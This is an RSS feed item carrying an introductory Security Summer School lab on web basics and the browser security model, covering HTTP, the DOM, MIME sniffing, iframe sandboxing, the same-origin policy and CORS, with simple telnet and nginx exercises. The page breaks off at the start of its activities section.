<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Security Summer School –</title><link>/docs/</link><description>Recent content on Security Summer School</description><generator>Hugo -- gohugo.io</generator><atom:link href="/docs/index.xml" rel="self" type="application/rss+xml"/><item><title>Web:</title><link>/web/web-basics-browser-security-model/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/web/web-basics-browser-security-model/</guid><description>
&lt;h1 id="introduction">Introduction&lt;/h1>
&lt;hr>
&lt;p>As the World Wide Web&amp;rsquo;s high-level topology consists mainly of personal computing devices (e.g. desktops, laptops, mobile devices) making HTTP requests to web servers, the general field of web security consists of three main sub-fields: client-side security (i.e. browser security), communications security and server-side security, or web application security.
This lab and the following will focus on the first sub-field, although they might provide some general information on the former two.&lt;/p>
&lt;p>The design of web applications, and their security in particular is influenced by the following characteristics:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>Statelessness:&lt;/strong> by default HTTP is a simple request-response protocol maintaining no state between successive communications.
This shortcoming led to the design of cookies, which are small pieces of information exchanged between the client and the web application.
The type of information exchanged using cookies needs to be carefully chosen, as a malicious client could possibly attempt to send back a malformed or forged cookie; additionally, cookies most often (but not always) represent confidential data, which means that they should only be transferred over a secure channel (i.e. HTTPS).&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Message format:&lt;/strong> HTTP requests have a specific format, namely they comprise plain-text header and data (although newer improvements also implement a binary protocol).
The header contains various information about the client or the server (e.g. a user-agent, page caching information, text encoding information), while the payload is very often (but not always) an HTML page.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Addressing:&lt;/strong> resources on the web are located using the URI/URL addressing scheme.
Possible vulnerabilities here include a misconfigured web server that allows viewing application-specific files, or worse, that allows accessing other files on the host machine.
While this information leakage is not very dangerous by itself, it may be used as an intermediary stage for other attacks.
You can read more about URLs here &lt;a href="https://skorks.com/2010/05/what-every-developer-should-know-about-urls/">[1]&lt;/a>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Request methods:&lt;/strong> HTTP communication is done by using methods, also called HTTP verbs.
The most used methods are GET, POST, PUT and DELETE.
The GET method is read-only and is used to retrieve data from the server.
A DELETE request is used to remove the specified resource from the server.
The PUT method is used to modify an entire resource.
POST requests are used to create new resources.
You can find more information about all methods here &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">[2]&lt;/a>.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>While the client is provided with HTML, JavaScript, CSS pages, modern web applications are implemented using general-purpose scripting or programming languages, e.g. PHP, Java, Python, Ruby, etc. and centralize their data using database systems such as MySQL.
Faulty back-end code can in itself provide a more dangerous attack surface to potentially malicious clients.&lt;/p>
&lt;p>&lt;img src="./assets/Session_01_Web_Basics_Diagram_01.jpg" alt="Client - Server">&lt;/p>
&lt;h1 id="web-applications-today">Web Applications Today&lt;/h1>
&lt;p>Dynamic websites provide tailored user experiences based on information known or given by the user.
The user usually has to authenticate to access the website and is authorized to use the services it provides.
In this case, the dynamic website contains information about the user, and there is therefore a great deal more for the attacker to steal.
The fundamental difference to static web pages is that a dynamic webpage/website contains functionality that can be compromised.
Breaching the security of the server itself is no longer necessary. It is sufficient to discover the security hole in the dynamic website functionality.
We, therefore, need to look at the security of a web application itself. A dynamic website can be considered to be a web application.&lt;/p>
&lt;p>Web applications introduce a new range of threats, or a new security perimeter, to put it another way.
Depending on the setup, web applications are commonly located in an internal network or in the demilitarized zone, which therefore renders network level defenses ineffective.
Network, services and operating system level defenses may have been perfectly set in place, but the system would still be vulnerable to a break-in.
Web applications commonly interact with internal systems, such as database servers.
The network level firewall could be blocking all traffic, but for web applications, it will have to allow HTTP and HTTPS traffic.
An attacker might therefore be able to bypass all network-level defenses.&lt;/p>
&lt;h1 id="types-of-vulnerabilities">Types of Vulnerabilities&lt;/h1>
&lt;p>These days, web applications are very complex being composed of multiple libraries, frameworks and using multiple external services.
Each component can have vulnerabilities.
Types of vulnerabilities:&lt;/p>
&lt;ul>
&lt;li>System vulnerabilities - applications or services that run inside an Operating System or an Operating System vulnerability&lt;/li>
&lt;li>Runtime vulnerabilities - when one of the components (frameworks such as PHP, Java, Python, WordPress, etc.) of the web application is vulnerable leads to a risk.&lt;/li>
&lt;li>Browser vulnerabilities - occasionally attackers will discover a vulnerability in the browser itself that allows execution of arbitrary binary code when a user simply visits a compromised site.
Browsers are complex pieces of machinery with many subsystems (HTML rendering, JavaScript engine, CSS parser, image parsers, etc.), and a small coding mistake in any of these systems could offer malicious code just enough of a foothold to get running.&lt;/li>
&lt;li>Vulnerabilities in web application implementation - here we can talk about OWASP Top Ten vulnerabilities &lt;a href="https://owasp.org/www-project-top-ten/">[3]&lt;/a>.&lt;/li>
&lt;/ul>
&lt;h1 id="http-hypertext-transfer-protocol">HTTP (Hypertext Transfer Protocol)&lt;/h1>
&lt;h2 id="http-request--response">HTTP Request / Response&lt;/h2>
&lt;p>Communication between clients and servers is done by requests and responses:&lt;/p>
&lt;ul>
&lt;li>A client (a browser) sends an HTTP request to the web&lt;/li>
&lt;li>An web server receives the request&lt;/li>
&lt;li>The server runs an application to process the request&lt;/li>
&lt;li>The server returns an HTTP response (output) to the browser&lt;/li>
&lt;li>The client (the browser) receives the response&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="./assets/http-request.png" alt="HTTP - Request">&lt;/p>
&lt;p>&lt;img src="./assets/http-response.png" alt="HTTP - Response">&lt;/p>
&lt;h3 id="basic-format-of-the-request">Basic format of the request:&lt;/h3>
&lt;p>VERB /resource/locator HTTP/1.1&lt;br>
Header1: Value1&lt;br>
Header2: Value2&lt;br>
…&lt;/p>
&lt;Body of the request>
&lt;p>Header is separated from the body by 2 CRLF sequences&lt;/p>
&lt;h3 id="request-headers">Request Headers:&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>Host:&lt;/strong> Indicates the desired host handling the request&lt;/li>
&lt;li>&lt;strong>Accept:&lt;/strong> Indicates what MIME type(s) are accepted by the client; often used to specify JSON or XML output for web-services&lt;/li>
&lt;li>&lt;strong>Cookie:&lt;/strong> Passes cookie data to the server&lt;/li>
&lt;li>&lt;strong>Referer:&lt;/strong> Page leading to this request (note: this is not passed to other servers when using HTTPS on the origin)&lt;/li>
&lt;li>&lt;strong>Authorization:&lt;/strong> Used for basic auth pages (mainly). Takes the form “Basic &amp;lt;base64’d username:password&amp;gt;”&lt;/li>
&lt;/ul>
&lt;h3 id="http-request-circle">HTTP Request Circle&lt;/h3>
&lt;p>A typical HTTP request / response circle:&lt;/p>
&lt;ol>
&lt;li>The browser requests an HTML page. The server returns an HTML file.&lt;/li>
&lt;li>The browser requests a style sheet. The server returns a CSS file.&lt;/li>
&lt;li>The browser requests a JPEG image. The server returns a JPG file.&lt;/li>
&lt;li>The browser requests JavaScript code. The server returns a JS file&lt;/li>
&lt;li>The browser requests data. The server returns data (in XML or JSON).&lt;/li>
&lt;/ol>
&lt;h3 id="xhr---xmlhttprequest">XHR - XMLHttpRequest&lt;/h3>
&lt;p>All browsers have a built-in XMLHttpRequest Object (XHR).
XHR is a JavaScript object that is used to transfer data between a web browser and a web server.
XHR is often used to request and receive data for the purpose of modifying a web page.
Despite the XML and HTTP in the name, XHR is used with other protocols than HTTP, and the data can be of many different types like HTML, CSS, XML, JSON, and plain text.&lt;/p>
&lt;p>The XHR Object is a Web Developers Dream, because you can:&lt;/p>
&lt;ul>
&lt;li>Update a web page without reloading the page&lt;/li>
&lt;li>Request data from a server - after the page has loaded&lt;/li>
&lt;li>Receive data from a server - after the page has loaded&lt;/li>
&lt;li>Send data to a server - in the background&lt;/li>
&lt;/ul>
&lt;p>The XHR Object is the underlying concept of AJAX and JSON:&lt;/p>
&lt;p>&lt;img src="./assets/xml_http_request.png" alt="XMLHttpRequest">&lt;/p>
&lt;h3 id="http-response-codes">HTTP Response Codes&lt;/h3>
&lt;ul>
&lt;li>1xx -&amp;gt; Informational responses&lt;/li>
&lt;li>2xx -&amp;gt; Successful responses&lt;/li>
&lt;li>3xx -&amp;gt; Redirects&lt;/li>
&lt;li>4xx -&amp;gt; Client errors&lt;/li>
&lt;li>5xx -&amp;gt; Server errors&lt;/li>
&lt;/ul>
&lt;p>xx = [00, 01 … 99]&lt;/p>
&lt;h3 id="url-uniform-resource-locator">URL (Uniform Resource Locator)&lt;/h3>
&lt;p>With Hypertext and HTTP, URL is one of the key concepts of the Web.
It is the mechanism used by browsers to retrieve any published resource on the web.&lt;/p>
&lt;p>URL stands for Uniform Resource Locator.
A URL is nothing more than the address of a given unique resource on the Web.
In theory, each valid URL points to a unique resource.
Such resources can be an HTML page, a CSS document, an image, etc.
In practice, there are some exceptions, the most common being a URL pointing to a resource that no longer exists or that has moved.
As the resource represented by the URL and the URL itself are handled by the Web server, it is up to the owner of the web server to carefully manage that resource and its associated URL.&lt;/p>
&lt;p>A URL incorporates the domain name, along with other detailed information, to create a complete address (or “web address”) to direct a browser to a specific page online called a web page.
In essence, it’s a set of directions and every web page has a unique one.&lt;/p>
&lt;p>&lt;img src="./assets/url.png" alt="URL">&lt;/p>
&lt;p>Special characters are encoded as hex:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>%0A&lt;/strong> = newline&lt;/li>
&lt;li>&lt;strong>%20&lt;/strong> or + = space, &lt;strong>%2B&lt;/strong> = + (special exception)&lt;/li>
&lt;/ul>
&lt;h1 id="browser">Browser&lt;/h1>
&lt;p>A web browser (commonly referred to as a browser) is a software application for accessing the information on the World Wide Web.
When a user requests a web page from a particular website, the web browser retrieves the necessary content from a web server and then displays the page on the screen.&lt;/p>
&lt;p>A list of Web Browsers: Google Chrome, Mozilla Firefox, Edge, Internet Explorer, Safari, Opera, Netscape, etc.&lt;/p>
&lt;h2 id="browser-execution-model">Browser execution model&lt;/h2>
&lt;p>Each browser windows or frame:&lt;/p>
&lt;ul>
&lt;li>Loads content&lt;/li>
&lt;li>Renders it
&lt;ul>
&lt;li>Processes HTML and scripts to display page&lt;/li>
&lt;li>May involve images, subframes, etc.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Responds to events such as:
&lt;ul>
&lt;li>User actions: OnClick, OnMouseover&lt;/li>
&lt;li>Rendering: OnLoad, OnBeforeUnload&lt;/li>
&lt;li>Timing: setTimeout(), clearTimeout()&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="./assets/browser-analogy.png" alt="browser-analogy">&lt;/p>
&lt;p>Examples of browser vulnerabilities:&lt;/p>
&lt;ul>
&lt;li>Google Chrome
&lt;ul>
&lt;li>CVE-2019-5795 &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2019-5795">https://nvd.nist.gov/vuln/detail/CVE-2019-5795&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Mozilla Firefox
&lt;ul>
&lt;li>CVE-2019-11716 &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11716">https://nvd.nist.gov/vuln/detail/CVE-2019-11716&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h1 id="developer-tools">Developer Tools&lt;/h1>
&lt;p>Modern browsers, such as Google Chrome, Mozilla Firefox and Microsoft Edge, include some functionality aimed at developers for easier debugging, testing and previews.
Anyone can use these tools to look at the internals of a web page.
As a security professional, or even a hobbyist, these instruments provide you with insightful information about the inner workings of any web application out there.
Even if it can only show the front-end code, it can create an overview of the structure and maybe reveal valuable details, such as the traffic sent from and received by the client.&lt;/p>
&lt;p>In order to open these tools, you can press &lt;em>F12&lt;/em> while navigating a web page in any browser mentioned, or by using &lt;em>Mouse Right Click&lt;/em> and selecting the Inspect Element option.
The latter lets you select which part of the page should be in focus when inspected.&lt;/p>
&lt;p>Alternatively, you can see the entire HTML code of a web page by selecting View Page Source in the Mouse Right Click context menu.&lt;/p>
&lt;p>Next, some of the core functionalities of these tools will be detailed (some names may vary slightly across browsers, but the functionality is mainly the same, so we will focus in Google Chrome here):&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Elements&lt;/strong>: In this tab you can see the HTML structure of the page. On the right panel, you can see the styles applied to each element when selected and add, remove or edit the properties directly from there.
This kind of inspection could lead to the discovery of hidden elements which can be toggled into view by altering the CSS code or could lead to the discovery of commented pieces of code which could contain sensitive data.
Also, the &lt;a href="#dom-document-object-model">DOM&lt;/a> (Document Object Model) structure of the page can be altered, and elements can be added or removed, such as scripts, input fields, etc. (any element in fact), which means that any JavaScript code used to sanitize user input or perform other functions can be bypassed.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="./assets/devtools-1.png" alt="Elements - Developer Tools">&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Console&lt;/strong>: The console prints errors which occurred during page rendering or during any action performed on the page, such as, but not limited to, error loading an image not found, error while performing an asynchronous request to fetch data, missing included file (such as CSS or Javascript files), errors in Javascript code from the included scripts, debug messages left by the developer, etc.
The console also has the ability to run any Javascript code by typing it directly there and interacting with the page.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="./assets/devtools-2.png" alt="Console - Developer Tools">&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Sources&lt;/strong>: This tab lets you see any file loaded in the front-end, such as images, JS, CSS etc. in an arborescent way.
This could be a good tool to inspect the JS scripts included in the current page.
They could reveal possibly valuable information, such as hidden paths or resources, or even critical pieces of functionality, which, if understood, could lead to successful exploits.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="./assets/devtools-3.png" alt="Sources - Developer Tools">&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Network&lt;/strong>: The network tab shows detailed information about every file loaded and every request and response made by the page.
You can find in-depth info about the &lt;a href="#http-hypertext-transfer-protocol">HTTP requests&lt;/a>, such as HTTP parameters, HTTP methods (GET, POST), HTTP status codes (200, 404, 500, etc.), loading time and size of each loaded element (image, script, etc).
Furthermore, clicking on one of the requests there, you can see the headers, the preview, the response (as raw content) and others.
This is useful for listing all the resources needed by a page, such as if there are any requests to APIs, additional scripts loaded, etc.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="./assets/devtools-4.png" alt="Network - Developer Tools">&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Application&lt;/strong>: This tab lets you see some specific data about the page, such as cookies (which will be covered in depth in the next section), local storage, session storage, cache, etc.
This can be useful to see which data is stored on the client-side and it may contain useful values.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="./assets/devtools-5.png" alt="Application - Developer Tools">&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Security&lt;/strong>: Detailed information about the protocol used (HTTP or HTTPS) and the website certificates.
Insecure websites can be vulnerable because HTTP sends data in plain text across the connection, which may be intercepted (e.g. Man in the Middle).&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="./assets/devtools-6.png" alt="Security - Developer Tools">&lt;/p>
&lt;h1 id="dom-document-object-model">DOM (Document Object Model)&lt;/h1>
&lt;p>The Document Object Model connects web pages to scripts or programming languages by representing the structure of a document, such as the HTML representing a web page, in memory.
Usually, that means JavaScript, although modeling HTML, SVG, or XML documents as objects are not part of the core JavaScript language, as such.&lt;/p>
&lt;p>Object-oriented interface used to read and write docs&lt;/p>
&lt;ul>
&lt;li>Web page in HTML in structured data&lt;/li>
&lt;li>DOM provides a representation of this hierarchy&lt;/li>
&lt;/ul>
&lt;p>The DOM represents a document with a logical tree. Each branch of the tree ends in a node, and each node contains objects.
DOM methods allow programmatic access to the tree. With them, you can change the document&amp;rsquo;s structure, style, or content.&lt;/p>
&lt;p>Nodes can also have event handlers attached to them. Once an event is triggered, the event handlers get executed.
DOM is an application programming interface.
Use the DOM when we interact with web pages.&lt;/p>
&lt;ul>
&lt;li>Add content to a HTML document&lt;/li>
&lt;li>Delete content from a HTML document&lt;/li>
&lt;li>Change Content on a HTML document&lt;/li>
&lt;/ul>
&lt;p>Every element within your document is an object: &amp;lt;head&amp;gt; tag, &amp;lt;body&amp;gt; tag, etc.
In javascript we can call methods on objects, we can call properties on objects in order to change the objects.&lt;/p>
&lt;p>&lt;img src="./assets/dom.png" alt="DOM">&lt;/p>
&lt;p>We can introduce nodes, all objects are nodes.
We can change the nodes, we can interact with them, create Animations, validations, etc.&lt;/p>
&lt;p>The Document interface represents any web page loaded in the browser and serves as an entry point into the web page&amp;rsquo;s content, which is the DOM tree.
The DOM tree includes elements such as body and table, among many others.
It provides functionality globally to the document, like how to obtain the page&amp;rsquo;s URL and create new elements in the document.&lt;/p>
&lt;p>&lt;strong>DOM&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Object-oriented interface used to read and write docs&lt;/li>
&lt;li>Web page in HTML is structured data&lt;/li>
&lt;li>DOM provides a representation of this hierarchy&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Examples&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Properties: document.alinkColor, document.URL, document.forms&lt;input disabled="" type="checkbox"> , document.links[], document.anchors&lt;input disabled="" type="checkbox"> &lt;/li>
&lt;li>Methods: document.write(document.referrer)&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Includes Browser Object Model (BOM)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>window, document, frames[], history, location, navigator (type
and version of the browser)&lt;/li>
&lt;/ul>
&lt;h1 id="mime-multipurpose-internet-mail-extensions">MIME (Multipurpose Internet Mail Extensions)&lt;/h1>
&lt;p>MIME is a specification for the format of non-text e-mail attachments that allows the attachment to be sent over the Internet.
MIME allows your mail client or Web browser to send and receive things like spreadsheets and audio, video and graphics files via Internet mail.
By default, many web servers are configured to report a MIME type of text/plain or application/octet-stream for unknown content types.
As new content types are invented or added to web servers, web administrators may fail to add the new MIME types to their web server&amp;rsquo;s configuration.
This is a major source of problems for users of Gecko-based browsers, which respect the MIME types as reported by web servers and web applications.
Here you can find an example for this type of vulnerability. &lt;a href="https://github.com/denimgroup/denimgroup-vulnerability-examples">[4]&lt;/a>&lt;/p>
&lt;p>&lt;strong>MIME Sniffing&lt;/strong> - The browser will often not just look at the Content-Type header that the server is passing, but also the contents of the page.
If it looks enough like HTML, it’ll be parsed as HTML. =&amp;gt; This led to IE 6/7-era bugs where image and text files containing HTML tags would execute as HTML (not so common anymore).&lt;/p>
&lt;p>&lt;strong>Encoding Sniffing&lt;/strong> - the encoding used on a document will be sniffed by browsers.
If you don’t specify an encoding for an HTML document, the browser will apply heuristics to determine it.
If you are able to control the way the browser decodes text, you may be able to alter the parsing.&lt;/p>
&lt;h1 id="security-mechanism">Security Mechanism&lt;/h1>
&lt;h2 id="isolation---frames-html-sandboxing">Isolation - Frames, HTML Sandboxing&lt;/h2>
&lt;h3 id="frame-and-iframe">Frame and iFrame&lt;/h3>
&lt;p>Windows may contain frames from different sources&lt;/p>
&lt;ul>
&lt;li>Frame: rigid division as part of frameset&lt;/li>
&lt;li>iFrame: floating inline frame&lt;/li>
&lt;/ul>
&lt;p>iFrame example:&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;iframe src=&amp;#34;simple_iframe.html&amp;#34; width=450 height=100&amp;gt;
if you can see this, your browser doesn&amp;#39;t understand IFRAME.
&amp;lt;/iframe&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="./assets/browser-security-mechanism.png" alt="BrowserSecurityMechanism">&lt;/p>
&lt;p>Why use frames?&lt;/p>
&lt;ul>
&lt;li>Delegate screen area to content from another source&lt;/li>
&lt;li>Browser provides isolation based on frames&lt;/li>
&lt;li>Parent may work even if frame is broken&lt;/li>
&lt;/ul>
&lt;p>In order to play a little bit with iframes follow the next instructions:&lt;/p>
&lt;ol>
&lt;li>&lt;code>user@hostname~$: sudo apt install nginx&lt;/code>&lt;/li>
&lt;li>Change &lt;code>index.html&lt;/code> file content with the above code&lt;/li>
&lt;li>&lt;code>user@hostname~$: sudo service nginx start&lt;/code>&lt;/li>
&lt;li>Access the browser as http://localhost&lt;/li>
&lt;li>Solve the problem in order to see the iframe&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="./assets/components-browser-security-policy.png" alt="ComponentsBrowserSecurityPolicy">&lt;/p>
&lt;h3 id="html-sandboxing">HTML Sandboxing&lt;/h3>
&lt;p>The sandbox attribute enables an extra set of restrictions for the content in the iframe.&lt;/p>
&lt;p>When the sandbox attribute is present, and it will:&lt;/p>
&lt;ul>
&lt;li>treat the content as being from a unique origin&lt;/li>
&lt;li>block form submission&lt;/li>
&lt;li>block script execution&lt;/li>
&lt;li>disable APIs&lt;/li>
&lt;li>prevent links from targeting other browsing contexts&lt;/li>
&lt;li>prevent content from using plugins (through &amp;lt;embed&amp;gt;, &amp;lt;object&amp;gt;, &amp;lt;applet&amp;gt; or others)&lt;/li>
&lt;li>prevent the content to navigate its top-level browsing context&lt;/li>
&lt;li>block automatically triggered features (such as automatically playing a video or automatically focusing a form control)&lt;/li>
&lt;/ul>
&lt;p>Add the below HTML code in the same index.html as above:&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;iframe src=&amp;#34;sandbox_iframe.html&amp;#34; sandbox width=450 height=100&amp;gt;
if you can see this, your browser doesn&amp;#39;t understand SANDBOX IFRAME.
&amp;lt;/iframe&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Access the page via browser http://localhost.&lt;/p>
&lt;p>The value of the sandbox attribute can either be just sandbox (then all restrictions are applied), or a space-separated list of predefined values that will REMOVE the particular restrictions.&lt;/p>
&lt;h1 id="same-origin-policy">Same-origin Policy&lt;/h1>
&lt;p>The same-origin policy is a critical security mechanism that restricts how a document or script loaded from one origin can interact with a resource from another origin.
It helps isolate potentially malicious documents, reducing possible attack vectors.&lt;/p>
&lt;p>In order to understand how the policy works, you also need to understand what is an origin.
Two URLs have the same origin if the protocol, port (if specified), and host are the same for both.
To better understand this, follow the table below:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>URL&lt;/th>
&lt;th>Outcome&lt;/th>
&lt;th>Reason&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;a href="http://store.company.com/dir2/other.html">http://store.company.com/dir2/other.html&lt;/a>&lt;/td>
&lt;td>Same origin&lt;/td>
&lt;td>Only the path differs&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="http://store.company.com/dir/inner/another.html">http://store.company.com/dir/inner/another.html&lt;/a>&lt;/td>
&lt;td>Same origin&lt;/td>
&lt;td>Only the path differs&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="https://store.company.com/page.html">https://store.company.com/page.html&lt;/a>&lt;/td>
&lt;td>Failure&lt;/td>
&lt;td>Different protocol&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="http://store.company.com:81/dir/page.html">http://store.company.com:81/dir/page.html&lt;/a>&lt;/td>
&lt;td>Failure&lt;/td>
&lt;td>Different port (http:// is port 80 by default)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="http://news.company.com/dir/page.html">http://news.company.com/dir/page.html&lt;/a>&lt;/td>
&lt;td>Failure&lt;/td>
&lt;td>Different host&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="why-is-this-important">Why is this important?&lt;/h2>
&lt;p>Assume you are logged into Facebook and visit a malicious website in another browser tab.
Without the same origin policy JavaScript on that website could do anything to your Facebook account that you are allowed to do.
For example read private messages, post status updates, analyse the HTML DOM-tree after you entered your password before submitting the form.&lt;/p>
&lt;p>But of course Facebook wants to use JavaScript to enhance the user experience.
So it is important that the browser can detect that this JavaScript is trusted to access Facebook resources.
That&amp;rsquo;s where the same origin policy comes into play: If the JavaScript is included from a HTML page on facebook.com, it may access facebook.com resources.&lt;/p>
&lt;p>Now replace Facebook with your online banking website, and it will be obvious that this is an issue.&lt;/p>
&lt;h2 id="is-this-always-the-case-to-access-only-resources-on-the-same-origin">Is this always the case, to access only resources on the same origin?&lt;/h2>
&lt;p>The most prevalent myth about Same-origin Policy is that it plainly forbids a browser to load a resource from a different origin.
Though we know that the thing that makes today&amp;rsquo;s web technologies so rich and colorful is the content loaded from different origins.
The presence of a huge content delivery network (CDN) ecosystem proves this is not true.&lt;/p>
&lt;p>Another prevalent myth is that an origin cannot send information to another one.
That is also not true.
Again we know that an origin can make a request to another one.
The information of the forms in one origin can be reached from another origin.
If we think of cloud payment systems integrated into a business workflow, these often operate by sending requests to another origin.
Even one of the most common web vulnerabilities, Cross-Site Request Forgery (CSRF), arises from that point.
CSRF is possible because of the ability of sites to make requests to each other.
This topic will be covered in a separate session more in-depth.&lt;/p>
&lt;h1 id="cors">CORS&lt;/h1>
&lt;p>Cross-Origin Resource Sharing (CORS) is a mechanism that uses additional HTTP headers to tell browsers to give a web application running at one origin, access to selected resources from a different origin.
A web application executes a cross-origin HTTP request when it requests a resource that has a different origin (domain, protocol, or port) from its own.&lt;/p>
&lt;p>An example of a cross-origin request: the front-end JavaScript code served from &lt;a href="https://domain-a.com">https://domain-a.com&lt;/a> uses XMLHttpRequest (AJAX) to make a request for &lt;a href="https://domain-b.com/data.json">https://domain-b.com/data.json&lt;/a>.&lt;/p>
&lt;p>For security reasons, browsers restrict cross-origin HTTP requests initiated from scripts.
For example, XMLHttpRequest follows the same-origin policy.
This means that a web application using those APIs can only request resources from the same origin the application was loaded from unless the response from other origins includes the right CORS headers.&lt;/p>
&lt;p>The CORS mechanism supports secure cross-origin requests and data transfers between browsers and servers.
Modern browsers use CORS in APIs such as XMLHttpRequest to mitigate the risks of cross-origin HTTP requests.
The CORS header is added by the server to the response.&lt;/p>
&lt;p>&lt;strong>CORS Header Syntax:&lt;/strong>&lt;br>
&lt;code>Access-Control-Allow-Origin: *&lt;/code>&lt;br>
&lt;code>Access-Control-Allow-Origin: &amp;lt;origin&amp;gt;&lt;/code>&lt;br>
&lt;code>Access-Control-Allow-Origin: null&lt;/code>&lt;br>
&lt;code>Access-Control-Allow-Origin: https://developer.mozilla.org&lt;/code>&lt;/p>
&lt;p>&lt;img src="./assets/CORS.jpg" alt="CORS">&lt;/p>
&lt;h1 id="talking-to-web-sites">Talking to web sites&lt;/h1>
&lt;p>Let&amp;rsquo;s go through the basics of how HTTP requests are made, using telnet to form requests. First, let&amp;rsquo;s connect to the vulnerable web server:&lt;/p>
&lt;pre tabindex="0">&lt;code>user@hostname~#: telnet 141.85.224.157 80
&lt;/code>&lt;/pre>&lt;p>Now let&amp;rsquo;s issue a simple GET.
The request is composed of:&lt;/p>
&lt;ul>
&lt;li>GET &lt;path> &lt;http-version>&lt;/li>
&lt;li>followed by other header contents&lt;/li>
&lt;li>followed by an additional newline, indicating the end of the request.&lt;/li>
&lt;/ul>
&lt;p>&lt;em>Please note the above bullet points and the fact that you need to provide an additional newline to indicate the end of the request.&lt;/em>&lt;/p>
&lt;pre tabindex="0">&lt;code>GET / HTTP/1.0
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>HEAD / HTTP/1.0
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>POST / HTTP/1.0
&lt;/code>&lt;/pre>&lt;p>The server&amp;rsquo;s response contains:&lt;/p>
&lt;ul>
&lt;li>A status code (200 OK in our case)&lt;/li>
&lt;li>Date information and information about the server&lt;/li>
&lt;li>Encoding and other info about the data, i.e. it&amp;rsquo;s MIME-type&lt;/li>
&lt;li>The length of the data&lt;/li>
&lt;li>The actual data&lt;/li>
&lt;/ul>
&lt;h1 id="tools">Tools&lt;/h1>
&lt;h2 id="postman">Postman&lt;/h2>
&lt;p>Postman is a tool through which you can send HTTP requests.
It can automate tests and integrate them into CI/CD pipeline.
You can simulate endpoints to test without having to set up a backend.
It can also monitor certain endpoints to check their health and performance. &lt;a href="https://www.postman.com/">[6]&lt;/a>&lt;/p>
&lt;h2 id="httpie">HTTPie&lt;/h2>
&lt;p>HTTPie is also used to send HTTP requests.
It can be used in the terminal, instead of utilities such as &lt;strong>curl&lt;/strong> and &lt;strong>wget&lt;/strong>.
It has an easy syntax, comes with highlighting and JSON assets. &lt;a href="https://httpie.io/">[7]&lt;/a>&lt;/p>
&lt;h2 id="hoppscotch">Hoppscotch&lt;/h2>
&lt;p>Hoppscotch is a tool that you can use from your browser or as a browser extension to quickly test certain endpoints.
It also supports MQTT or GraphQL requests. &lt;a href="https://hoppscotch.io/">[8]&lt;/a>&lt;/p>
&lt;h1 id="further-reading">Further Reading&lt;/h1>
&lt;ul>
&lt;li>[1] &lt;a href="https://skorks.com/2010/05/what-every-developer-should-know-about-urls/">https://skorks.com/2010/05/what-every-developer-should-know-about-urls/&lt;/a>&lt;/li>
&lt;li>[2] &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods&lt;/a>&lt;/li>
&lt;li>[3] &lt;a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/&lt;/a>&lt;/li>
&lt;li>[4] &lt;a href="https://github.com/denimgroup/denimgroup-vulnerability-examples">https://github.com/denimgroup/denimgroup-vulnerability-examples&lt;/a>&lt;/li>
&lt;li>[5] &lt;a href="https://portswigger.net/web-security/cors/same-origin-policy">https://portswigger.net/web-security/cors/same-origin-policy&lt;/a>&lt;/li>
&lt;li>[6] &lt;a href="https://www.postman.com/">https://www.postman.com/&lt;/a>&lt;/li>
&lt;li>[7] &lt;a href="https://httpie.io/">https://httpie.io/&lt;/a>&lt;/li>
&lt;li>[8] &lt;a href="https://hoppscotch.io/">https://hoppscotch.io/&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="activities">Activities&lt;/h1>
&lt;p>&lt;strong>1.&lt;/strong> The below image represents a snippet with DevTools containing information about a web application.
What can you discover in the next image ?
